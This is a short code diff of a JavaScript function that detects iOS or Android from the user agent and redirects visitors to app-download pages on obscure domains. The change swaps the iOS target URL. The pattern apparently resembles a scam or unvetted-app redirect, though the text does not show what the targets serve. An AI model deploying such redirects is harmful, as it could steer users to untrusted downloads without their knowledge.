@@ -10,7 +10,7 @@ function browserRedirect() {
     var bIsWM = sUserAgent.match(/windows mobile/i) == "windows mobile";
     if (bIsIphoneOs || bIsIpad) {
         // alert('iphone') // 识别 苹果
-        window.location.href = "https://down.bolinart.shop:1818/WXWz.html";
+        window.location.href = "https://down.appiosapp.net/WXWz.html";
     } else if (bIsMidp || bIsUc7 || bIsUc || bIsAndroid || bIsCE || bIsWM) {
         //alert('android') // 识别 安卓
         window.location.href = "https://mvsos.live/nlzyupymat";
